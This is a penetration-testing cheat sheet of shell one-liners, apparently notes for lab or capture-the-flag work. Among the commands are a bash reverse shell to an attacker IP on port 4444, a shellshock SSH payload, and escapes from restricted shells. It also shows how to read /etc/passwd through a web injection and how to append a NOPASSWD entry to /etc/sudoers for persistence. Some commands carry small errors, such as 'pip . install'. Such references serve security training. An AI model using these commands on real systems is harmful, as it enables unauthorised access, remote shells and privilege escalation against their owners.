Proper bash shell:

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

Print all users in /etc/passwd from web injection:

```shell
cat /etc/passwd | awk -F':' '{print $1}'
```

Replace each ',' with a newline:

```shell
echo -n 'kas:asddas,asdkjlaskjdlasd:asda,asdasasd:aaaaaa' | sed 's/,/\n/g'
```

Print all text between |> and <| on a new line

```shell
grep -shzoP "(\|>)(.*?)(<\|)" response | sed  "s/|>/ /g" | sed "s/<|/\n/g"
find / -name "test.py" -type f 2>/dev/null
```

Port knocking:

```shell
nmap $TARGET_IP -p 7469,8475,9842 -r --max-retries 0 --max-parallelism 1 -sT --scan-delay 200ms --max-rtt-timeout 200ms -Pn
```

```shell
nc -z $TARGET_IP PORT1 PORT2 PORT3
```


Generate user password for use in /etc/passwd

```shell
openssl passwd -1 -salt salt password
```

Get all users with history:

```bash
find /home -name .bash_history -exec wc -l {} \; 2>/dev/null | sort | grep -v "^0"
```

Find all "test.py" files

```bash
find / -name "test.py" -type f 2>/dev/null
```

List all sudo commands for user:

```shell
sudo -l
```

Start HTTP server

```shell
python3 -m http.server
```

```shell
python -m SimpleHTTPServer
```

```shell
ruby -run -e httpd path/to/your/project -p 80
```

```shell
php -S 0.0.0.0:80
```

Escape profile restricted bash accounts with SSH access

```shell
ssh $USERNAME@$TARGET_IP -t "bash --noprofile"
```

```shell
echo os.system("/bin/bash")
```

Other methods:

```shell
ssh $USERNAME@$TARGET_IP -t "/bin/sh" or "/bin/bash"
```

```shell
#shellshock
ssh $USERNAME@TARGET_IP -t "() { :; }; /bin/bash"
```

Login using SSH key file

```bash
ssh -i private_id_rsa USER@$TARGET_IP -t "bash --noprofile"
```

Check for ports that are opened on other network devices

```bash
netstat -antup
```

```bash
ss -tunlp
```

---

Add current directory to the PATH variable:

```shell
export PATH=$PWD:$PATH
```

or use with SUDO:

```shell
sudo PATH=$PWD:$PATH /path/to/executable
```

---

Reverse shell to port 4444:
---
```shell
bash -c "bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1"
```

Assign user an id in case of NFS / mount
---
```shell
usermod -u $U_ID $USERNAME
```

Assign an id to a group
---
```shell
groupmod -g $GROUP_ID $GROUP_NAME
```

Add user to sudo
---
```shell
usermod -aG sudo $USERNAME
```

---

Add user to SUDOers:
---
```bash
echo "$USERNAME  ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

---


Connect using SSH in case of old/weird encryption:
---

```shell
ssh -oHostKeyAlgorithms=+ssh-dss $USER@$TARGET_IP
```

or

```shell
ssh -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa $USER@$TARGET_IP
```

---
**Python install from setup.py**
---

```shell
pip . install
```